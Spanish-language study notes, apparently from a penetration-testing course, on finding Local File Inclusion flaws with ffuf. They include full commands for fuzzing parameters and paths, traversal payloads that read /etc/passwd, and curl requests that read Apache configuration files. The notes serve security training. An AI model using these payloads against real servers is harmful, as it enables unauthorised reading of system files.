
## 🎯 Concepto

El escaneo automatizado permite identificar parámetros vulnerables a **Local File Inclusion (LFI)** y localizar archivos importantes del servidor mediante herramientas como `ffuf` y wordlists especializadas.

Aunque la automatización ahorra tiempo, **las pruebas manuales siguen siendo importantes** para detectar vulnerabilidades que las herramientas pueden pasar por alto y adaptar los payloads a las medidas de seguridad de la aplicación.

---

## 1. 🔍 Fuzzing de parámetros

Las aplicaciones pueden tener parámetros GET o POST que no aparecen en los formularios HTML y que, por tanto, podrían pasar desapercibidos durante una revisión manual.

Podemos utilizar `ffuf` para descubrir parámetros GET potencialmente interesantes.

### Comando

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
-fs 2287
```

**Elementos importantes:**

|Opción|Función|
|---|---|
|`-w`|Especifica la wordlist.|
|`:FUZZ`|Define la palabra que se sustituirá en cada petición.|
|`-u`|Define la URL objetivo.|
|`-fs 2287`|Filtra respuestas cuyo tamaño sea de 2287 bytes.|

Ejemplo de resultado:

```
language [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Si encontramos el parámetro `language`, podemos probarlo con los payloads LFI estudiados anteriormente.

> **Importante:** el tamaño filtrado debe corresponder a una respuesta de referencia que no indique una vulnerabilidad. Si las respuestas legítimas tienen el mismo tamaño, podemos ocultar resultados interesantes.

## 2. 📂 Fuzzing de payloads LFI

Una vez identificado un parámetro potencialmente vulnerable, podemos probar múltiples payloads de inclusión de archivos.

### Wordlist recomendada

```
/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

Esta wordlist contiene payloads LFI, técnicas de evasión y rutas de archivos comunes.

### Comando

```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
-fs 2287
```

### Ejemplos de resultados

```
../../../../../../../../etc/passwd
../../../../../../../../etc/hosts
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

Los resultados pueden revelar payloads que permiten acceder a archivos como `/etc/passwd` o `/etc/hosts`.

**No debemos asumir que un resultado es vulnerable únicamente porque devuelve HTTP 200.** Hay que comprobar manualmente el contenido de la respuesta y confirmar que se ha leído el archivo esperado.

## 3. 🗂️ Descubrir el Webroot del servidor

El **webroot** es el directorio desde el que el servidor web sirve los archivos de la aplicación.

Conocer su ruta puede ser útil para localizar archivos subidos cuando no podemos acceder a ellos mediante rutas relativas.

### Wordlist para Linux

```
/opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
```

También existen wordlists para encontrar directorios web en Windows.

### Comando

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
-fs 2287
```

Ejemplo de resultado:

```
/var/www/html/ [Status: 200, Size: 0, Words: 1, Lines: 1]
```

En este caso, el escaneo ha identificado:

```
/var/www/html/
```

La cantidad de directorios que debemos atravesar con `../` depende de la estructura de rutas y de cómo procese la aplicación el parámetro vulnerable.

Si no encontramos el webroot mediante fuzzing, podemos intentar obtener su ruta leyendo los archivos de configuración del servidor.

## 4. ⚙️ Fuzzing de configuraciones y logs

Los archivos de configuración pueden revelar información importante, como:

- La ruta del webroot.
    
- Las ubicaciones de los logs.
    
- El usuario y el grupo con los que se ejecuta Apache.
    
- Variables de entorno relevantes.
    

Podemos usar una wordlist específica para buscar estos archivos.

### Ejemplo de comando

```
ffuf -w ./LFI-WordList-Linux:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
-fs 2287
```

La wordlist `LFI-WordList-Linux` del ejemplo es un archivo local que debemos tener disponible.

### Ejemplos de resultados interesantes

```
/etc/hosts
/etc/hostname
/etc/login.defs
/etc/fstab
/etc/apache2/apache2.conf
/etc/apache2/mods-enabled/status.conf
/etc/apache2/mods-enabled/alias.conf
/etc/apache2/envvars
/etc/adduser.conf
```

Una wordlist especializada puede encontrar archivos que no aparecen en `LFI-Jhaddix.txt`. Por eso, en determinadas situaciones, conviene utilizar listas específicas además de las listas generales.

## 5. 📄 Analizar manualmente la configuración de Apache

Una vez localizado un archivo interesante, podemos leerlo mediante la vulnerabilidad LFI.

### Paso 1. Leer `apache2.conf`

```
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf'
```

Entre las directivas que podemos encontrar están:

```
ServerAdmin webmaster@localhost
DocumentRoot /var/www/html

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
```

De esta información obtenemos:

|Directiva|Información|
|---|---|
|`DocumentRoot`|Ruta del webroot.|
|`ErrorLog`|Archivo de registro de errores.|
|`CustomLog`|Archivo de registro de accesos.|
|`APACHE_LOG_DIR`|Variable que determina el directorio de los logs.|

En este ejemplo, el webroot es `/var/www/html`, mientras que las rutas de los logs dependen de la variable `APACHE_LOG_DIR`.

### Paso 2. Resolver la variable de entorno

Podemos leer el archivo `/etc/apache2/envvars`:

```
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars'
```

Buscamos una línea similar a:

```
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

Con esta información podemos deducir la ubicación habitual de los logs:

```
/var/log/apache2/access.log
/var/log/apache2/error.log
```

La configuración real del servidor es la que determina las rutas efectivas.

### Flujo de enumeración

```
LFI
 └── Fuzzing de archivos
      └── /etc/apache2/apache2.conf
           ├── DocumentRoot
           ├── ErrorLog
           └── CustomLog
                └── /etc/apache2/envvars
                     └── APACHE_LOG_DIR
```

**Idea clave:** no te limites a leer un archivo aislado. La información encontrada puede revelar nuevas rutas y permitir una enumeración más precisa.

## 6. 🛠️ Herramientas automatizadas para LFI

El módulo menciona las siguientes herramientas:

|Herramienta|Uso|
|---|---|
|`LFISuite`|Automatización de pruebas LFI.|
|`LFiFreak`|Automatización de pruebas de inclusión de archivos.|
|`liffy`|Herramienta para detectar y explotar vulnerabilidades LFI.|
|`ffuf`|Fuzzing de parámetros, payloads y rutas de archivos.|

### Limitaciones

- Muchas herramientas especializadas no reciben mantenimiento.
    
- Algunas dependen de Python 2, una versión obsoleta.
    
- Pueden pasar por alto vulnerabilidades detectables manualmente.
    
- Sus resultados deben verificarse para descartar falsos positivos.
    

Para un análisis más fiable, combina la automatización con pruebas manuales y la revisión de las respuestas.

## 7. 🧠 Chuleta para el examen

|Objetivo|Wordlist o archivo|Comando o acción|
|---|---|---|
|Descubrir parámetros GET|`burp-parameter-names.txt`|`ffuf` con `?FUZZ=value`|
|Probar payloads LFI|`LFI-Jhaddix.txt`|`ffuf` con `?language=FUZZ`|
|Encontrar el webroot|`default-web-root-directory-linux.txt`|Probar rutas que terminen en `/index.php`|
|Buscar archivos del sistema|`LFI-WordList-Linux`|Fuzzing de rutas mediante LFI|
|Obtener configuración de Apache|`/etc/apache2/apache2.conf`|Leer mediante LFI|
|Encontrar la ruta de los logs|`/etc/apache2/envvars`|Buscar `APACHE_LOG_DIR`|

### Metodología recomendada

1. **Descubrir parámetros:** buscar parámetros GET o POST que no sean evidentes.
    
2. **Probar payloads comunes:** utilizar `LFI-Jhaddix.txt`.
    
3. **Confirmar manualmente:** verificar que se obtiene el contenido del archivo esperado.
    
4. **Identificar el webroot:** probar rutas comunes del servidor.
    
5. **Enumerar configuraciones y logs:** utilizar wordlists específicas.
    
6. **Analizar los resultados:** leer los archivos encontrados y extraer nuevas rutas.
    
7. **Continuar manualmente:** aprovechar la información obtenida para probar otras técnicas de LFI.
    

> **Qué debes recordar:** `ffuf` automatiza las pruebas, pero no sustituye la validación manual. Los filtros por tamaño ayudan a reducir el ruido, las wordlists específicas amplían la enumeración y los archivos de configuración pueden revelar información que no habríamos descubierto mediante fuzzing básico.
